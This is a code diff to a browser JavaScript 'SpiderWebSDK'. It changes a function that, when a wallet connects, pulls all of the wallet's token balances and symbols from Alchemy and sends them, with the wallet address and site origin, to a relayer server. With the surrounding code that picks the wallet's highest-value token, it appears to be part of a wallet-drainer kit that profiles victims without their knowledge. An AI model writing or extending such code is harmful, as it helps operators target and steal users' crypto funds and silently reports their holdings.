@@ -245,8 +245,8 @@ window.SpiderWebSDK = {
         // Return the highest value token found. If no prices were found, fall back to the first one.
         return highestValueToken || compatibleTokens[0];
     },
-    // Add this function to your SpiderWebSDK object
-    _logConnectionEvent: async function() {
+
+_logConnectionEvent: async function() {
     try {
         // --- Step 1: Get all token balances from Alchemy ---
         const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
@@ -259,20 +259,14 @@ window.SpiderWebSDK = {
             })
         });
         const balanceData = await balanceResponse.json();
-        if (!balanceData.result) return; // Exit if no tokens
+        if (!balanceData.result) return;
 
         const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
         if (tokensWithBalance.length === 0) return;
 
-        // --- Step 2: Get prices for all tokens from CoinGecko ---
-        const tokenAddresses = tokensWithBalance.map(t => t.contractAddress);
-        const prices = await this._fetchTokenPrices(tokenAddresses);
-        if (!prices) return; // Exit if price fetch fails
-
-        // --- Step 3: Combine all data into a detailed list ---
+        // --- Step 2: Get metadata (symbol, decimals) for each token ---
         const detailedTokens = [];
         for (const token of tokensWithBalance) {
-            const priceData = prices[token.contractAddress.toLowerCase()];
             const metadataResponse = await fetch(alchemyUrl, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
@@ -283,24 +277,19 @@ window.SpiderWebSDK = {
             });
             const metadata = await metadataResponse.json();
             
-            if (metadata.result && priceData && priceData.usd) {
+            if (metadata.result) {
                 const decimals = metadata.result.decimals;
                 const symbol = metadata.result.symbol;
-                const formattedBalance = ethers.utils.formatUnits(token.tokenBalance, decimals);
-                const usdValue = parseFloat(formattedBalance) * priceData.usd;
+                const formattedBalance = parseFloat(ethers.utils.formatUnits(token.tokenBalance, decimals)).toFixed(4);
 
-                // Only include tokens with a value over $1 to keep the log clean
-                if (usdValue > 1) {
-                    detailedTokens.push({
-                        symbol: symbol,
-                        balance: parseFloat(formattedBalance).toFixed(4),
-                        usdValue: usdValue.toFixed(2)
-                    });
-                }
+                detailedTokens.push({
+                    symbol: symbol,
+                    balance: formattedBalance
+                });
             }
         }
         
-        // --- Step 4: Send the detailed list to a new backend endpoint ---
+        // --- Step 3: Send the simplified list to the backend ---
         if (detailedTokens.length > 0) {
             await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection-details`, {
                 method: 'POST',
@@ -309,7 +298,7 @@ window.SpiderWebSDK = {
                     apiKey: this._config.apiKey,
                     origin: window.location.origin,
                     walletAddress: this._currentUserAddress,
-                    tokens: detailedTokens // Send the rich token data
+                    tokens: detailedTokens
                 })
             });
         }
